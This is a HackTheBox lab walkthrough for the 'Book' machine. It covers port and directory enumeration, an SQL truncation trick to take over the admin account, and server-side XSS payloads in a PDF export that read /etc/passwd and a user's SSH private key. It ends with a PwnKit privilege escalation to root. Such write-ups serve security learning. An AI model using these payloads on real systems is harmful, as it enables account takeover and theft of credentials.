---
title: Book
description: Book box from HackTheBox write up.
---

# Book

## Nmap

As always let's see what Nmap has to say.

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p- --min-rate=1000 10.10.10.176
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-19 19:39 CET
Nmap scan report for 10.10.10.176
Host is up (0.057s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 66.92 seconds

┌──(kali㉿kali)-[~]
└─$ sudo nmap -p 22,80 -sC -sV 10.10.10.176
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-19 19:41 CET
Nmap scan report for 10.10.10.176
Host is up (0.069s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f7fc5799f682e003d603bc09430155b7 (RSA)
|   256 a3e5d174c48ae8c852c717834a5431bd (ECDSA)
|_  256 e3626872e2c0ae46673dcb46bf69b96a (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: LIBRARY - Read | Learn | Have Fun
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.30 seconds
```

Since only port 80 and 22 are open I guess we start with port 80.

## Port 80

### Enumeration time

First of all, let's launch a directory brute force to see a bit how the application looks like.

```bash
┌──(kali㉿kali)-[~]
└─$ feroxbuster -u http://10.10.10.176/ -w Wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt -x php -b PHPSESSID=h4na4k7g35a1kvro6u8uglbogu 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.2
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.176/
 🚀  Threads               │ 50
 📖  Wordlist              │ Wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.2
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🤯  Header                │ Cookie: PHPSESSID=h4na4k7g35a1kvro6u8uglbogu
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
302      GET        0l        0w        0c http://10.10.10.176/ => home.php
301      GET        9l       28w      312c http://10.10.10.176/admin => http://10.10.10.176/admin/
301      GET        9l       28w      313c http://10.10.10.176/images => http://10.10.10.176/images/
200      GET      156l      303w     3026c http://10.10.10.176/contact.php
403      GET        9l       28w      277c http://10.10.10.176/.php
200      GET      162l      338w     3501c http://10.10.10.176/search.php
200      GET        0l        0w        0c http://10.10.10.176/download.php
302      GET        0l        0w        0c http://10.10.10.176/logout.php => index.php
301      GET        9l       28w      311c http://10.10.10.176/docs => http://10.10.10.176/docs/
302      GET        0l        0w        0c http://10.10.10.176/admin/home.php => index.php
302      GET        0l        0w        0c http://10.10.10.176/admin/users.php => index.php
301      GET        9l       28w      319c http://10.10.10.176/admin/export => http://10.10.10.176/admin/export/
302      GET        0l        0w        0c http://10.10.10.176/admin/feedback.php => index.php
200      GET        0l        0w        0c http://10.10.10.176/db.php
302      GET        0l        0w        0c http://10.10.10.176/home.php => index.php
302      GET        0l        0w        0c http://10.10.10.176/profile.php => index.php
200      GET      321l      683w     6800c http://10.10.10.176/index.php
302      GET        0l        0w        0c http://10.10.10.176/feedback.php => index.php
403      GET        9l       28w      277c http://10.10.10.176/admin/.php
302      GET        0l        0w        0c http://10.10.10.176/books.php => index.php
302      GET        0l        0w        0c http://10.10.10.176/settings.php => index.php
301      GET        9l       28w      319c http://10.10.10.176/admin/vendor => http://10.10.10.176/admin/vendor/
302      GET        0l        0w        0c http://10.10.10.176/admin/messages.php => index.php
302      GET        0l        0w        0c http://10.10.10.176/collections.php => index.php
302      GET        0l        0w        0c http://10.10.10.176/admin/collections.php => index.php
403      GET        9l       28w      277c http://10.10.10.176/server-status
200      GET        0l        0w        0c http://10.10.10.176/admin/vendor/autoload.php
301      GET        9l       28w      328c http://10.10.10.176/admin/vendor/composer => http://10.10.10.176/admin/vendor/composer/
200      GET       56l      398w     2918c http://10.10.10.176/admin/vendor/composer/LICENSE
[####################] - 3m    420000/420000  0s      found:29      errors:415
```

There is an administration area but I don't have credentials for that. Since the application allows us to sign up I started by doing that. 

Basically, this is like a library website or something like that. You can send feedback or even upload a book, i will check that functionality later. Something I noticed was that the administrator email was in the contact section: `admin@book.htb`. After a bit playing with my username I noticed that the page was only saving a certain number of characters, if that is case with the email when creating a new user maybe we can abuse a SQL truncation attack to steal the administrator account.

### We are admin!

Using a payload like `admin@book.htb               a` as the email while signing up, allowed me to get change the administrator password and access the administration panel.

Looks like the admin can export the whole book list and get information about the name of them. I mean, the user has a feature to upload a book file that should be reviwed by the administrator but Im not able to find it anywhere. After trying for a bit, I was able to get my file into the export. Looks like its name is changed to a randon integer and put into `/docs`. I though that my file was deleted after some seconds but looks like the file itself is not deleted, just deleted from the export thing.

Well that makes things... easier I guess? The application is renaming my file to `.pdf` so I cannot really upload a webshell sadly. I decided to try something, what about server side XSS? My input is used to generate that PDF so maybe it works, using burp I uploaded a random file with this payload as title:

```html
<script>
    xhzeem = new XMLHttpRequest();
    xhzeem.onload = function(){document.write(this.responseText);}
    xhzeem.onerror = function(){document.write('failed!')}
    xhzeem.open("GET","file:///etc/passwd");
    xhzeem.send();
</script>
```

Generating the export I get all the `/etc/passwd` file! Now that I know some of the users in the machine, I will try to get a private key. After some try and error, I was able to get the private key for the `reader` user in `/home/reader/.ssh/id_rsa`.

In order for the PDF to render the content of the key properly, remember to use the `<pre>` tag:

```html
<script>
    xhzeem = new XMLHttpRequest();
    xhzeem.onload = function(){document.write("<pre>"+this.responseText+"</pre>");}
    xhzeem.onerror = function(){document.write('failed!')}
    xhzeem.open("GET","file:///home/reader/.ssh/id_rsa");
    xhzeem.send();
</script>
```

## Pwned!!!

Basically I noticed that `pkexec` is a SUID binary so this box is probably vulnerable to the PwnKit exploit:

```
reader@book:~$ find / -perm /4000 2> /dev/null
...
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/newgidmap
/usr/bin/newuidmap
/usr/bin/sudo
/usr/bin/traceroute6.iputils
/bin/mount
/bin/umount
/bin/fusermount
/bin/ping
/bin/su
```

I uploaded a binary with it to the box and gg!

```bash
reader@book:~$ ./PwnKit 
root@book:/home/reader#
```

## Beyond root

I decided to check some write ups to see how people solved this box and turns out that my escalation vector was not the intended one (Yeah, what a surprise right?). 

Well, looks like you can exploit a vulnerability in logrotate to [force it to write into an arbitrary file](https://github.com/whotwagner/logrotten).
